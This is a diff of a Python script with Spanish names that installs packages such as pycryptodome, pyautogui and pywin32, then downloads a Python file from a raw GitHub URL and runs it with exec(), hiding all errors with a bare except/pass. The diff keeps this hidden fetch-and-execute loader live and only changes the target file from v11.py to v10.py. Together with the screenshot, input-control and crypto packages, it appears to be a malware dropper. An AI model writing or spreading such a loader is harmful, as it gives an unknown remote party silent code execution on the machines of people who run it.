@@ -1,6 +1,7 @@
 import subprocess
 import sys
 import platform
+import urllib.request
 
 def instalar_dependencias():
     paquetes = ["pycryptodome", "pillow", "pyautogui", "requests", "pywin32"]
@@ -38,10 +39,9 @@ except ImportError:
     pass
 
 try:
-    import urllib.request
-
-    url_v11 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v11.py'
-    with urllib.request.urlopen(url_v11) as response:
-        exec(response.read().decode('utf-8'))
-except:
+    url_script = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py'
+    with urllib.request.urlopen(url_script) as response:
+        codigo_remoto = response.read().decode('utf-8')
+        exec(codigo_remoto, globals())
+except Exception:
     pass
